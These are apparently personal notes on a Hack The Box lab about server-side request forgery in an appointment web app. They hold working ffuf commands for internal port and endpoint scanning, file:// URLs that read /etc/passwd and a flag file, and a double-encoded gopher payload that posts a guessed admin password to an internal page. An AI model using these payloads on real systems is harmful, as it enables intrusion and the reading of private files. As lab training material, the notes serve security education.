# SSRF

[Server-Side Request Forgery (SSRF)](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery) is a vulnerability where an attacker can manipulate a web application into sending unauthorized requests from the server. This vulnerability often occurs when an application makes HTTP requests to other servers based on user input. Successful exploitation of SSRF can enable an attacker to access internal systems, bypass firewalls, and retrieve sensitive information.

## Identifying SSRF

### Confirming SSRF

Looking at the web application, we are greeted with some generic text as well as functionality to schedule appointments:

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

We can observe the following request in Burp -->

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

As we can see, the request contains our chosen date and a URL in the parameter `dateserver`. This indicates that the web server fetches the availability information from a separate system determined by the URL passed in this POST parameter.

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

In a `netcat` listener, we can receive a connection, thus confirming SSRF:

```shell-session
eldeim@htb[/htb]$ nc -lnvp 8000

listening on [any] 8000 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 38782
GET /ssrf HTTP/1.1
Host: 172.17.0.1:8000
Accept: */*
```

To determine whether the HTTP response reflects the SSRF response to us, let us point the web application to itself by providing the URL `http://127.0.0.1/index.php`:

<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

Since the response contains the web application's HTML code, the SSRF vulnerability is not blind, i.e., the response is displayed to us.

### Enumerating the System

We can use the SSRF vulnerability to conduct a port scan of the system to enumerate running services. To achieve this, we need to be able to infer whether a port is open or not from the response to our SSRF payload. If we supply a port that we assume is closed (such as `81`), the response contains an error message:

<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

&#x20;We can do this using a fuzzer like `ffuf`. Let us first create a wordlist of the ports we want to scan. In this case, we'll use the first 10,000 ports:

```shell-session
eldeim@htb[/htb]$ seq 1 10000 > ports.txt
```

Afterward, we can fuzz all open ports by filtering out responses containing the error message we have identified earlier.

```shell-session
eldeim@htb[/htb]$ ffuf -w ./ports.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" -fr "Failed to connect to"

<SNIP>

[Status: 200, Size: 45, Words: 7, Lines: 1, Duration: 0ms]
    * FUZZ: 3306
[Status: 200, Size: 8285, Words: 2151, Lines: 158, Duration: 338ms]
    * FUZZ: 80
```

The results show that the web server runs a service on port `3306`, typically used for a SQL database.

### PoC - Questions

* Exploit a SSRF vulnerability to identify an internal web application. Access the internal application to obtain the flag.

<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

Okay! Do ffuzing to the port -->

```
ffuf -w ./ports.txt -u http://10.129.201.127/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" -fr "Failed to connect to"
________________________________________________

80                      [Status: 200, Size: 8285, Words: 2151, Lines: 158, Duration: 2295ms]
3306                    [Status: 200, Size: 45, Words: 7, Lines: 1, Duration: 7ms]
8000                    [Status: 200, Size: 37, Words: 1, Lines: 1, Duration: 22ms]
```

> Nice! 127.0.0.1:8000

## Exploiting SSRF

### Accessing Restricted Endpoints

As we have seen, the web application fetches availability information from the URL `dateserver.htb`. However, when we add this domain to our hosts file and attempt to access it, we are unable to do so:

<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

However, we can access and enumerate the domain through the SSRF vulnerability. For instance, we can conduct a directory brute-force attack to enumerate additional endpoints using `ffuf`. To do so, let us first determine the web server's response when we access a non-existing page:

<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

As we can see, the web server responds with the default Apache 404 response. To also filter out any HTTP 403 responses, we will filter our results based on the string `Server at dateserver.htb Port 80`, which is contained in default Apache error pages. Since the web application runs PHP, we will specify the `.php` extension:

```shell-session
eldeim@htb[/htb]$ ffuf -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://dateserver.htb/FUZZ.php&date=2024-01-01" -fr "Server at dateserver.htb Port 80"

<SNIP>

[Status: 200, Size: 361, Words: 55, Lines: 16, Duration: 3872ms]
    * FUZZ: admin
[Status: 200, Size: 11, Words: 1, Lines: 1, Duration: 6ms]
    * FUZZ: availability
```

We have successfully identified an additional internal endpoint that we can now access through the SSRF vulnerability by specifying the URL `http://dateserver.htb/admin.php` in the `dateserver` POST parameter to potentially access sensitive admin information.

### Local File Inclusion (LFI)

Since the URL scheme is part of the URL supplied to the web application, let us attempt to read local files from the file system using the `file://` URL scheme. We can achieve this by supplying the URL `file:///etc/passwd`

<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

### The gopher Protocol

However, we are restricted to GET requests as there is no way to send a POST request with the `http://` URL scheme. For instance, let us consider a different version of the previous web application. Assuming we identified the internal endpoint `/admin.php` just like before, however, this time the response looks like this:

<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

&#x20;From the HTML form, we can deduce that we need to send a POST request to `/admin.php` containing the password in the `adminpw` POST parameter. However, there is no way to send this POST request using the `http://` URL scheme.

Instead, we can use the [gopher](https://datatracker.ietf.org/doc/html/rfc1436) URL scheme to send arbitrary bytes to a TCP socket. This protocol enables us to create a POST request by building the HTTP request ourselves.

Assuming we want to try common weak passwords, such as `admin`, we can send the following POST request:

```http
POST /admin.php HTTP/1.1
Host: dateserver.htb
Content-Length: 13
Content-Type: application/x-www-form-urlencoded

adminpw=admin
```

We need to URL-encode all special characters to construct a valid gopher URL from this. In particular, spaces (`%20`) and newlines (`%0D%0A`) must be URL-encoded. Afterward, we need to prefix the data with the gopher URL scheme, the target host and port, and an underscore, resulting in the following gopher URL:

```
gopher://dateserver.htb:80/_POST%20/admin.php%20HTTP%2F1.1%0D%0AHost:%20dateserver.htb%0D%0AContent-Length:%2013%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Aadminpw%3Dadmin
```

However, since we are sending our URL within the HTTP POST parameter `dateserver`, which itself is URL-encoded, we need to URL-encode the entire URL again to ensure the correct format of the URL after the web server accepts it. Otherwise, we will get a `Malformed URL` error. After URL encoding the entire gopher URL one more time, we can finally send the following request:

```http
POST /index.php HTTP/1.1
Host: 172.17.0.2
Content-Length: 265
Content-Type: application/x-www-form-urlencoded

dateserver=gopher%3a//dateserver.htb%3a80/_POST%2520/admin.php%2520HTTP%252F1.1%250D%250AHost%3a%2520dateserver.htb%250D%250AContent-Length%3a%252013%250D%250AContent-Type%3a%2520application/x-www-form-urlencoded%250D%250A%250D%250Aadminpw%253Dadmin&date=2024-01-01
```

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

### PoC - Questions

* Exploit the SSRF vulnerability to identify an additional endpoint. Access that endpoint to obtain the flag

<pre><code>file:///etc/passwd
<strong>## and
</strong><strong>file:///flag.txt&#x26;
</strong></code></pre>

